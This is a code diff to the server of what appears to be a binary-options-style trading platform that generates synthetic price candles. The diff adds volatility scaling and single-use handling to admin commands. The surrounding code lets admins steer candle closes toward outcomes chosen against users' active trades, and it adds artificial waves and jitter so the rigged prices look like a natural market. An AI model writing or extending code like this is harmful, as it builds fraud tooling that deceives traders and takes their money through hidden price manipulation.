@@ -319,7 +319,9 @@ function generateDynamicCandle(timestamp, open, command, cloneData) {
             timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open),
             isPredetermined: true, isNatural: false, isAdminCommand: true, 
             targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), 
-            pattern: command || 'CUSTOM_V2'
+            pattern: command || 'CUSTOM_V2',
+            volatility: (cloneData && cloneData.volatility) ? parseFloat(cloneData.volatility) : 1.0,
+            isCustomV2: (command === 'CUSTOM_V2')
         };
     }
 
@@ -644,8 +646,9 @@ function steerCandleToTarget(candle, currentPrice, newTargetClose, bias) {
         
         // Realistic intermediate waves and natural market pullbacks
         if (i < remainingSteps) {
-            const wave = Math.sin(stepProgress * Math.PI * 2) * (spread * 0.16);
-            const naturalJitter = (Math.random() - 0.5) * (candle.open * 0.000035);
+            const volMultiplier = (candle.volatility && !isNaN(candle.volatility)) ? Math.max(0.2, Math.min(10.0, parseFloat(candle.volatility))) : 1.0;
+            const wave = Math.sin(stepProgress * Math.PI * 2 * volMultiplier) * (spread * 0.16 * Math.min(2.5, volMultiplier));
+            const naturalJitter = (Math.random() - 0.5) * (candle.open * 0.000035 * volMultiplier);
             wp += wave + naturalJitter;
         }
         candle.waypoints[currentWaypointIndex + i] = roundPrice(Math.max(MIN_PRICE, wp));
@@ -669,6 +672,20 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     if (!lastCandle) return null;
 
     if (currentPeriod > lastCandle.timestamp) {
+        // If the candle that just completed was a Custom V2 candle, broadcast event for admin auto-reset
+        if (lastCandle.isCustomV2) {
+            lastCandle.isCustomV2 = false;
+            wss.clients.forEach((client) => {
+                if (client.readyState === WebSocket.OPEN) {
+                    client.send(JSON.stringify({
+                        type: 'v2_completed',
+                        market: marketData.marketId,
+                        timestamp: lastCandle.timestamp
+                    }));
+                }
+            });
+        }
+
         let newCandle;
 
         const activeTrades = getActiveTradesForMarket(marketData.marketId);
@@ -694,6 +711,9 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
             const clone = marketData.nextCandleCloneData;
             newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, cmd, clone);
             newCandle.isAdminCommand = true;
+            newCandle.isCustomV2 = (cmd === 'CUSTOM_V2');
+            newCandle.volatility = (clone && clone.volatility) ? parseFloat(clone.volatility) : 1.0;
+            newCandle.hasAdminSteered = true;
             const bias = getCommandBias(cmd, clone);
             const relevantTrades = expiringTrades.length > 0 ? expiringTrades : activeTrades;
             newCandle.targetClose = adjustTargetCloseForTrades(newCandle.open, newCandle.targetClose, bias, relevantTrades);
@@ -702,8 +722,16 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
             } else {
                 newCandle.targetHigh = roundPrice(Math.max(newCandle.targetHigh, newCandle.targetClose + (newCandle.open * 0.00003)));
             }
+            // CRITICAL: Clear single-use next candle command so it NEVER persists to future candles!
             marketData.nextCandleCommand = null;
             marketData.nextCandleCloneData = null;
+            marketData.activeAdminCommand = null;
+            const mPath = marketPathFromId(marketData.marketId);
+            delete activeCommandsDb[marketData.marketId];
+            if (mPath) delete activeCommandsDb[mPath];
+            if (marketData.marketName) delete activeCommandsDb[marketData.marketName];
+            db.ref(`admin/activeCommands/${marketData.marketId}`).remove().catch(() => {});
+            db.ref(`admin/market_overrides/${marketData.marketId}`).remove().catch(() => {});
         }
 
         // 1b. Persistent Admin Trade / Market Steering (Ensures all candles until trade expiry stay on target!)
@@ -729,13 +757,13 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
 
             if (!overrideData) {
                 for (const k of candidateMarketKeys) {
-                    if (activeCommandsDb[k] && (Date.now() - (activeCommandsDb[k].timestamp || 0) < 600000)) {
+                    if (activeCommandsDb[k] && !activeCommandsDb[k].isNextCandleOnly && (Date.now() - (activeCommandsDb[k].timestamp || 0) < 600000)) {
                         overrideData = activeCommandsDb[k];
                         break;
                     }
                 }
             }
-            if (!overrideData && marketData.activeAdminCommand && (Date.now() - (marketData.activeAdminCommand.timestamp || 0) < 600000)) {
+            if (!overrideData && marketData.activeAdminCommand && !marketData.activeAdminCommand.isNextCandleOnly && (Date.now() - (marketData.activeAdminCommand.timestamp || 0) < 600000)) {
                 overrideData = marketData.activeAdminCommand;
             }
 
@@ -958,11 +986,12 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
 
     let idealPrice = startWp + (endWp - startWp) * steppedProgress;
 
-    // Quotex High-Frequency Dynamic Jitter & Natural Micro-Vibrations
-    const baseVolatility = candle.open * 0.000035;
-    const fastTickOscillation = Math.sin(now * 0.07) * (baseVolatility * 0.45);
-    const slowTickWave = Math.cos(now * 0.015) * (baseVolatility * 0.3);
-    const randomJitter = (Math.random() - 0.5) * (baseVolatility * 0.3);
+    // Quotex High-Frequency Dynamic Jitter & Natural Micro-Vibrations (Scaled by candle volatility)
+    const volMultiplier = (candle.volatility && !isNaN(candle.volatility)) ? Math.max(0.2, Math.min(10.0, parseFloat(candle.volatility))) : 1.0;
+    const baseVolatility = candle.open * 0.000035 * volMultiplier;
+    const fastTickOscillation = Math.sin(now * (0.07 * Math.min(2.5, volMultiplier))) * (baseVolatility * 0.45);
+    const slowTickWave = Math.cos(now * (0.015 * Math.min(2.5, volMultiplier))) * (baseVolatility * 0.3);
+    const randomJitter = (Math.random() - 0.5) * (baseVolatility * 0.35);
 
     marketData.currentPrice = idealPrice + fastTickOscillation + slowTickWave + randomJitter;
 
@@ -1052,6 +1081,9 @@ app.get('/api/history/:marketId(*)', async (req, res) => {
 
 app.post('/api/admin/command', async (req, res) => {
     const { marketId, command, cloneData, targetOutcome, tradeDirection, tradeId, uid, marketName } = req.body;
+    const isNextCandleOnly = (command === 'CUSTOM_V2' || command === 'CUSTOM_CLONE' || req.body.isNextCandle);
+    const vol = req.body.volatility ? parseFloat(req.body.volatility) : (cloneData?.volatility ? parseFloat(cloneData.volatility) : 1.0);
+    if (cloneData) cloneData.volatility = vol;
     
     // Store in tradeOverridesDb immediately if tradeId is present
     if (tradeId) {
@@ -1060,6 +1092,7 @@ app.post('/api/admin/command', async (req, res) => {
             command,
             bias: command,
             tradeDirection,
+            volatility: vol,
             timestamp: Date.now()
         };
     }
@@ -1071,12 +1104,15 @@ app.post('/api/admin/command', async (req, res) => {
     const cmdData = {
         command,
         bias,
+        cloneData: cloneData || null,
+        volatility: vol,
         outcome: targetOutcome || (bias === 'GREEN' ? 'WIN_BIAS' : 'LOSS_BIAS'),
         targetOutcome: targetOutcome || null,
         tradeDirection: tradeDirection || null,
         tradeId: tradeId || null,
         uid: uid || null,
         marketName: marketName || null,
+        isNextCandleOnly,
         timestamp: Date.now()
     };
 
@@ -1106,6 +1142,8 @@ app.post('/api/admin/command', async (req, res) => {
             command,
             cloneData: cloneData || null,
             bias,
+            volatility: vol,
+            isNextCandleOnly,
             targetOutcome: targetOutcome || null,
             tradeId: tradeId || null,
             tradeDirection: tradeDirection || null,
@@ -1115,7 +1153,7 @@ app.post('/api/admin/command', async (req, res) => {
 
         // Check if it's a multi-candle pattern
         if (MULTI_CANDLE_PATTERNS[command]) {
-            market.nextCandleQueue = MULTI_CANDLE_PATTERNS[command].map(s => ({...s, patternName: command}));
+            market.nextCandleQueue = MULTI_CANDLE_PATTERNS[command].map(s => ({...s, patternName: command, volatility: vol}));
             market.nextCandleCommand = null;
             market.nextCandleCloneData = null;
         } else {
@@ -1127,13 +1165,15 @@ app.post('/api/admin/command', async (req, res) => {
         }
 
         // 🔥 INSTANT MID-CANDLE INTERVENTION: Steer currently running candle immediately 🔥
-        if (market.history && market.history.length > 0) {
+        // EXCLUDE next-candle commands so current running candle is NEVER disturbed!
+        if (!isNextCandleOnly && market.history && market.history.length > 0) {
             const currentCandle = market.history[market.history.length - 1];
             const now = Date.now();
             if (now < currentCandle.timestamp + TIMEFRAME) {
                 currentCandle.isAdminCommand = true;
                 currentCandle.hasAdminSteered = true;
                 currentCandle.pattern = command;
+                currentCandle.volatility = vol;
 
                 const activeTrades = getActiveTradesForMarket(market.marketId || marketId);
                 const relevantTrades = activeTrades;
@@ -1148,7 +1188,7 @@ app.post('/api/admin/command', async (req, res) => {
         tgMsg += `🎯 <b>Command:</b> ${command}\n`;
         if (targetOutcome) tgMsg += `🏆 <b>Target Outcome:</b> ${targetOutcome}\n`;
         if (cloneData) {
-            tgMsg += `🎨 <b>Clone Details:</b> ${cloneData.isGreen ? 'Green' : 'Red'} | Body: ${cloneData.body} | U: ${cloneData.upperWick} | L: ${cloneData.lowerWick}\n`;
+            tgMsg += `🎨 <b>Clone Details:</b> ${cloneData.isGreen ? 'Green' : 'Red'} | Body: ${cloneData.body} | U: ${cloneData.upperWick} | L: ${cloneData.lowerWick} | Vol: ${vol}x\n`;
         }
         
         sendTgMessage(tgMsg);
@@ -1197,13 +1237,13 @@ setInterval(() => {
         }
         if (!overrideData) {
             for (const k of candidateMarketKeys) {
-                if (activeCommandsDb[k] && (now - (activeCommandsDb[k].timestamp || 0) < 600000)) {
+                if (activeCommandsDb[k] && !activeCommandsDb[k].isNextCandleOnly && (now - (activeCommandsDb[k].timestamp || 0) < 600000)) {
                     overrideData = activeCommandsDb[k];
                     break;
                 }
             }
         }
-        if (!overrideData && marketData.activeAdminCommand && (now - (marketData.activeAdminCommand.timestamp || 0) < 600000)) {
+        if (!overrideData && marketData.activeAdminCommand && !marketData.activeAdminCommand.isNextCandleOnly && (now - (marketData.activeAdminCommand.timestamp || 0) < 600000)) {
             overrideData = marketData.activeAdminCommand;
         }
 
